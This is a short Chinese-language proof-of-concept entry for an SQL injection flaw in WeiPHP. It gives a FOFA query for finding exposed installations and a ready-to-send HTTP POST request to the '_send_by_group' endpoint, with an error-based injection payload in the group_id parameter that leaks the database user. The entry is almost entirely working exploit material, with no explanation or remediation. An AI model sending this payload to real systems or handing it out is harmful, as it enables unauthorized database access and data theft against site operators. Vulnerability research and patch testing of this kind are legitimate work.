
## WeiPHP存在SQL注入漏洞

## fofa
```
app="WeiPHP"
```

## poc
```
POST /public/index.php/weixin/message/_send_by_group HTTP/1.1
Host: 
Content-Type: application/x-www-form-urlencoded
Accept-Encoding: gzip
Connection: close
 
group_id[0]=exp&group_id[1]=%29+and+updatexml%281%2Cconcat%280x7e%2C%28select+user%28%29%29%2C0x7e%29%2C1%29+--
```
